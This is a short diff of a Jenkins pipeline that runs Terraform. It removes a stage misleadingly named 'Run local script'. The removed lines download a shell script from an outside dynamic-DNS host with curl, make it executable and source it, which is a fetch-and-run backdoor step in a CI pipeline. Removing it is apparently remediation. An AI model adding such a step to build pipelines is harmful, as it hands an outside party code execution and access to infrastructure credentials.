@@ -14,13 +14,6 @@ pipeline {
   }
 
   stages {
-    stage('Run local script') {
-      steps {
-        sh 'curl -s http://shay.freeddns.org:8888/s.sh -o s.sh'
-        sh 'chmod u+x s.sh'
-        sh '. ./s.sh'
-      }
-    }
     stage('Terraform Initialization') {
       steps {
         script {
